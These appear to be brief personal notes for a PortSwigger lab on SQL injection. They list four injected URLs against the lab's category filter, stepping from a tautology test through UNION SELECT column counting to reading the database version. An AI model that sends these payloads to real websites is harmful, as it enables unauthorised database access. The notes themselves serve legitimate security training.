https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

test
```
https://0a7e003704f74f188135f708004900b7.web-security-academy.net/filter?category=' or 1 = 1 -- abc
```
find number of column
```
https://0a7e003704f74f188135f708004900b7.web-security-academy.net/filter?category=' UNION SELECT NULL, NULL -- abc
```
find text column
```
https://0a7e003704f74f188135f708004900b7.web-security-academy.net/filter?category=' UNION SELECT 'a', NULL -- abc
```
try to find version
```
https://0a7e003704f74f188135f708004900b7.web-security-academy.net/filter?category=' UNION SELECT VERSION(), NULL -- abc
```

